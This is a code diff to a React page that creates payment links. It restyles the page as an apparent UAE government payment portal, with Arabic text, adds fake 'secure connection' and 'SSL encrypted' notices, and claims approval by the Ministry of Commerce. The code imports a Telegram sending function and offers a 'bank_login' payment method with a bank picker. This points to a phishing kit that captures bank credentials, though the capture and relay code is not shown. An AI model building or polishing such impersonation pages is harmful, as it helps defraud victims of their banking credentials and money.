@@ -4,6 +4,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Badge } from "@/components/ui/badge";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
@@ -14,7 +15,7 @@ import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countr
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
+import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText, Shield, Lock as LockIcon } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -68,6 +69,16 @@ const CreatePaymentLink = () => {
       description: selectedServiceData?.description || `خدمة ${selectedServiceData?.nameAr}`
     };
   }, [selectedService, selectedServiceData, countryData]);
+
+  // UAE Government Color Scheme
+  const uaeColors = {
+    primary: "#CE1126",
+    secondary: "#00732F",
+    accent: "#000000",
+    background: "#FFFFFF",
+    lightGray: "#F5F5F5",
+    border: "#E0E0E0",
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -161,34 +172,79 @@ const CreatePaymentLink = () => {
   }
 
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
-      <div className="container mx-auto px-4">
-        {/* Telegram Test Component */}
-        <div className="mb-6">
-          <TelegramTest />
-        </div>
-
-        <div className="max-w-2xl mx-auto">
-          <Card className="p-4 shadow-elevated">
-            <div
-              className="h-16 -m-4 mb-4 rounded-t-xl relative"
-              style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-              }}
-            >
-              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
-              <div className="absolute bottom-2 right-4 text-white">
+    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
+      {/* Header */}
+      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
+        <div className="container mx-auto px-4 py-3">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
+                <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
+              </div>
+              <div className="text-white">
                 <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
-                <p className="text-xs opacity-90">{countryData.nameAr}</p>
+                <p className="text-xs opacity-90">{countryData?.nameAr || ''}</p>
+              </div>
+            </div>
+            <Badge variant="secondary" className="bg-white text-gray-800">
+              <LockIcon className="w-3 h-3 ml-1" />
+              اتصال آمن
+            </Badge>
+          </div>
+        </div>
+      </div>
+
+      <div className="container mx-auto px-4 py-8">
+        <div className="max-w-3xl mx-auto">
+          {/* Telegram Test Component */}
+          <div className="mb-6">
+            <TelegramTest />
+          </div>
+
+          {/* Security Notice */}
+          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
+            <div className="flex items-start gap-3">
+              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+              <div>
+                <h3 className="font-semibold text-sm mb-1">إنشاء رابط سداد آمن</h3>
+                <p className="text-xs text-gray-600">
+                  قم بإنشاء روابط سداد آمنة للخدمات الحكومية والعامة
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
+            {/* Header */}
+            <div
+              className="p-6 border-b"
+              style={{ backgroundColor: uaeColors.lightGray }}
+            >
+              <div className="flex items-center justify-between">
+                <div>
+                  <h2 className="text-xl font-bold mb-1" style={{ color: uaeColors.accent }}>
+                    إنشاء رابط سداد جديد
+                  </h2>
+                  <p className="text-sm text-gray-600">{countryData?.nameAr}</p>
+                </div>
+                <div
+                  className="w-16 h-16 rounded-xl flex items-center justify-center"
+                  style={{ backgroundColor: `${uaeColors.primary}15` }}
+                >
+                  <Building2 className="w-8 h-8" style={{ color: uaeColors.primary }} />
+                </div>
               </div>
             </div>
 
-            <form onSubmit={handleSubmit} className="space-y-4">
+            {/* Form */}
+            <form onSubmit={handleSubmit} className="p-6 space-y-5">
               {/* Payment Service Selection */}
               <div>
-                <Label className="mb-2 text-sm">خدمة السداد *</Label>
+                <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  خدمة السداد *
+                </Label>
                 <Select value={selectedService} onValueChange={setSelectedService}>
-                  <SelectTrigger className="h-10">
+                  <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                     <SelectValue placeholder="اختر خدمة السداد" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
@@ -203,7 +259,7 @@ const CreatePaymentLink = () => {
 
               {/* Service Logo and Description */}
               {selectedService && serviceBranding && selectedServiceData && (
-                <div className="p-3 rounded-lg border border-border bg-card/50">
+                <div className="p-4 rounded-lg border" style={{ backgroundColor: uaeColors.lightGray, borderColor: uaeColors.border }}>
                   <div className="flex items-center gap-3 mb-2">
                     {serviceBranding.logo && (
                       <img
@@ -216,50 +272,52 @@ const CreatePaymentLink = () => {
                       />
                     )}
                     <div>
-                      <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
-                      <p className="text-xs text-muted-foreground">{selectedServiceData.category}</p>
+                      <h3 className="font-semibold text-sm" style={{ color: uaeColors.accent }}>
+                        {selectedServiceData.nameAr}
+                      </h3>
+                      <p className="text-xs text-gray-600">{selectedServiceData.category}</p>
                     </div>
                   </div>
-                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
+                  <p className="text-xs text-gray-600">{serviceBranding.description}</p>
                 </div>
               )}
 
               {/* Payment Reference */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <Hash className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <Hash className="w-4 h-4" />
                   رقم أو مرجع الدفع *
                 </Label>
                 <Input
                   value={paymentRef}
                   onChange={(e) => setPaymentRef(e.target.value)}
                   placeholder="مثال: INV-12345, PAY-67890"
-                  className="h-9 text-sm"
+                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                   required
                 />
               </div>
 
               {/* Payment Description */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <FileText className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <FileText className="w-4 h-4" />
                   وصف الدفع
                 </Label>
                 <Input
                   value={paymentDescription}
                   onChange={(e) => setPaymentDescription(e.target.value)}
                   placeholder="مثال: رسوم خدمات، اشتراك، فاتورة"
-                  className="h-9 text-sm"
+                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                 />
               </div>
 
               {/* Payment Amount */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <DollarSign className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <DollarSign className="w-4 h-4" />
                   مبلغ السداد
                   {country && (
-                    <span className="text-xs text-muted-foreground">
+                    <span className="text-xs text-gray-600">
                       ({getCurrencyName(country)})
                     </span>
                   )}
@@ -269,12 +327,12 @@ const CreatePaymentLink = () => {
                   value={paymentAmount}
                   onChange={(e) => setPaymentAmount(e.target.value)}
                   placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-9 text-sm"
+                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                   step="0.01"
                   min="0"
                 />
                 {country && (
-                  <p className="text-xs text-muted-foreground mt-1">
+                  <p className="text-xs text-gray-600 mt-2">
                     💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                   </p>
                 )}
@@ -282,12 +340,12 @@ const CreatePaymentLink = () => {
 
               {/* Payment Method Selection */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <CreditCard className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                  <CreditCard className="w-4 h-4" />
                   طريقة الدفع *
                 </Label>
                 <Select value={paymentMethod} onValueChange={setPaymentMethod}>
-                  <SelectTrigger className="h-10">
+                  <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                     <SelectValue placeholder="اختر طريقة الدفع" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
@@ -312,9 +370,11 @@ const CreatePaymentLink = () => {
               {/* Bank Selection (only if bank_login selected) */}
               {paymentMethod === "bank_login" && (
                 <div>
-                  <Label className="mb-2 text-sm">اختر البنك *</Label>
+                  <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                    اختر البنك *
+                  </Label>
                   <Select value={selectedBank} onValueChange={setSelectedBank}>
-                    <SelectTrigger className="h-10">
+                    <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                       <SelectValue placeholder="اختر البنك" />
                     </SelectTrigger>
                     <SelectContent className="bg-background z-50">
@@ -328,19 +388,42 @@ const CreatePaymentLink = () => {
                 </div>
               )}
 
+              {/* Security Info */}
+              <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
+                <div className="flex items-start gap-3">
+                  <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+                  <div>
+                    <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>
+                      محمي بتشفير SSL
+                    </h4>
+                    <p className="text-xs text-gray-600">
+                      جميع روابط السداد محمية ومشفرة بأعلى معايير الأمان
+                    </p>
+                  </div>
+                </div>
+              </div>
+
               <Button
                 type="submit"
                 size="lg"
-                className="w-full h-11 text-white mt-6"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
-                }}
+                className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
+                style={{ backgroundColor: uaeColors.primary }}
                 disabled={createLink.isPending}
               >
                 {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
               </Button>
             </form>
-          </Card>
+          </div>
+
+          {/* Security Footer */}
+          <div className="mt-6 text-center">
+            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
+              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
+              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
+                معتمد من وزارة التجارة
+              </span>
+            </div>
+          </div>
         </div>
 
         {/* Success Dialog */}
